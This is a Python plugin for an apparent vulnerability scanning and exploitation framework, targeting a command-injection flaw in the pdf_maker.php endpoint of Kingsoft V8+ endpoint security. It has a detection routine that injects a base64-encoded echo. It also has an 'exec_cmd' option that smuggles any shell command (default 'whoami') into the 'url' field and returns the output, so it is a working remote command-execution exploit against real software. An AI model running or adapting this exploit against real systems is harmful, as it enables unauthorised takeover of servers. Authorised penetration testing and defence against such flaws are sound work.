# -*-* coding:UTF-8
import base64
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "金山V8+终端安全系统存在命令执行漏洞",
        "description": "金山V8+终端安全系统存在命令执行漏洞, 攻击者可利用该漏洞获取服务器控制权",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(12)
        pat = f'\" || echo {random_str} ||'
        r = self.request(
            method='post',
            path='./inter/pdf_maker.php',
            data=f"url={base64.b64encode(pat.encode()).decode()}&fileName=xxx",
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        pat = f'\" || {cmd} ||'
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './inter/pdf_maker.php'),
            data=f"url={base64.b64encode(pat.encode()).decode()}&fileName=xxx",
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15
        )
        if r.status_code == 200 and 'fileName' in r.text:
            data = r.text.split('{"nResult"')
            if len(data) == 2:
                return data[0]
